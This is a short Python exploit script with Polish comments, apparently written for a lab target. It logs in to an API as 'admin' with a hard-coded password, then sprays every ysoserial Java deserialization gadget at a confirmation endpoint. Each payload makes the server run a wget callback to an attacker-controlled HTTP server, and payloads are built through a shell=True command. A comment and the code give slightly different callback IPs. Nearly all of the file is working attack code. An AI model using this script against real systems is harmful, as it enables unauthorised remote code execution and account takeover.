#!/usr/bin/python3
from subprocess import run, PIPE
import requests

# Przed uruchomieniem pamiętaj, aby uruchomić serwer HTTP!
# `python3 -m http.server 8080`

def get_token():
    """Funkcja get_token ma na celu zalogować się do API jako użytkownik *admin*, aby uzyskać jego token JWT"""
    res = requests.request(url="http://target.lab:5000/login", method="POST", json={"username": "admin", "password": "pantera"})
    return res.json()["access_token"]

# Funkcja ta ma na celu zwiększenie czytelności kodu
def send_payload(payload, token):
    """
    send_payload ma za zadaniem wysłać request z naszym payloadem Insecure Deserialization z podanym tokenem autoryzacji
    """
    res = requests.request(
            url="http://target.lab:5000/support/confirm",
            method="POST",
            json={"confirmation": payload},
            headers={
                "Authorization": f"Bearer {token}"
            })
    print(res)

token = get_token()

# Ładujemy nazwy dostępnych gadgetów z ysoserial.jar
payloads_file = open("./payloads.txt")
payloads = payloads_file.readlines()

# Przechodzimy w pętli przez każdy gadget
for payload_name in payloads:
    payload_name = payload_name.strip()
    
    # Tworzymy komendę dla danego gadetu
    # Kod, który ma się wykonać po udanej eksploitacji to `wget http://10.255.255.10:8080/{payload_name}` tak abyśmy mogli rozpoznać, który payload został poprawnie wykonany
    # Następnie otrzymany wynik z narzędzia ysoserial.jar enkodujemy w Base64 i usuwamy znaki nowej linii
    command = f'java -jar /home/kali/ysoserial-all.jar {payload_name} "wget http://10.255.255.100:8080/{payload_name}" | base64 | tr -d "\\n"'

    # Wykonujemy komendę, koniecznie z opcją `shell=True`, w przeciwnym wypadku ciąg znaków `command` będzie traktowany jako nazwa programu do uruchomienia, a nie komenda
    result = run(command, shell=True, stdout=PIPE, stderr=PIPE)

    # Dekodujemy otrzymany ciąg bajtów na ciąg znaków
    payload = result.stdout.decode("UTF-8")

    # Wysyłamy i czekamy aż otrzymany request HTTP
    send_payload(payload, token)